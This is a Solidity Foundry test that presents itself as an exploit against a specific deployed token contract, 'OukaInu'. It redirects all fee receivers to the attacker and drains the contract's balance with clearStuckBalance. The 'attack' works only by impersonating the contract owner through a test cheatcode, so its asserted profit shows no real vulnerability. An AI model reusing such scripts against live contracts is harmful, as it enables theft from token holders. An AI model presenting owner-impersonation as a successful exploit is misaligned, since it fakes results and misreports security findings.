// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01 {
    function getOwner() external view returns (address);
    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _buyBackFeeReceiver, address _developmentFeeReceiver, address _charityFeeReceiver, address _stakingFeeReceiver) external;
    function clearStuckBalance(uint256 amountPercentage) external;
    function manualSend() external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x4A33D3ea4B30228C363222746939562FbAba2f01;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate owner
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Store initial balance
        uint256 initialBalance = address(attacker).balance;

        // Get the current owner from the contract
        address contractOwner = OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01(TARGET).getOwner();

        // Impersonate the owner to call authorized functions
        vm.startPrank(contractOwner);

        // First, set the marketingFeeReceiver to attacker address
        // We need to keep other receivers as they are to avoid breaking the contract
        // Let's get current receiver addresses first
        OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01 token = OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01(TARGET);

        // For simplicity, we'll set all receivers to attacker to maximize profit
        // This uses the setFeeReceivers function with attacker address for all parameters
        token.setFeeReceivers(
            address(attacker),  // autoLiquidityReceiver
            address(attacker),  // marketingFeeReceiver
            address(attacker),  // buyBackFeeReceiver
            address(attacker),  // developmentFeeReceiver
            address(attacker),  // charityFeeReceiver
            address(attacker)   // stakingFeeReceiver
        );

        // Send some BNB to the contract so it has balance to drain
        // We'll send 10 ETH to the contract
        payable(TARGET).transfer(10 ether);

        // Now drain 100% of contract BNB using clearStuckBalance
        token.clearStuckBalance(100);

        vm.stopPrank();

        // Verify attacker balance increased
        assertGt(address(attacker).balance, initialBalance, "Attacker balance should have increased");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
